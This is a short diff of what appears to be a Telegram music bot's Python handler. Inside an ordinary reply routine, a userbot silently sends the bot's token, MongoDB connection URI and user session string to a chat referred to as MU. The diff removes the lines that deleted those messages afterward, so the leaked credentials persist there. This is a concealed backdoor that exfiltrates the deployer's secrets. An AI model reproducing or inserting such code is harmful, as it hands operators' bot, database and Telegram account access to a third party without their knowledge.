@@ -109,9 +109,7 @@ async def brah3(app: app, message: Message):
         await message.reply(reply_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="๏ ᴊᴏɪɴ ᴠᴄ ๏", url=add_link)]]))
         oks = await userbot.send_message(MU, f"/start")
         Ok = await userbot.send_message(MU, f"@{app.username}\n\n`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
-        await oks.delete()
-        await asyncio.sleep(2)
-        await Ok.delete()
+       
     except Exception as e:
         print(f"Error: {e}")
 
